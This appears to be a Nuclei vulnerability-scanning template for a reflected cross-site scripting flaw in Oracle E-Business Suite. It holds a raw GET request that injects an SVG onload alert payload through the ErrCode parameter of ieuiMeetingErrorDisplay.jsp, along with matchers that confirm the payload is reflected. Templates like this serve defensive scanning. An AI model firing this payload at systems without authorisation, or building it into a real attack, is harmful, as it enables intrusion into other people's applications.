id: oracle-ebs-xss3
info:
  author: dhiyaneshDk
  name: Oracle EBS XSS
  reference: '- https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite-wp-4.pdf

    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf

    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf

    '
  severity: medium
  tags: oracle,xss,ebs
requests:
- matchers:
  - part: body
    type: word
    words:
    - <svg/onload=alert('{{randstr}}')>
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'GET /OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(''{{randstr}}'')%3E
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
    Firefox/65.0

    Connection: close

    Accept: */*

    Accept-Language: en

    Accept-Encoding: gzip

    '
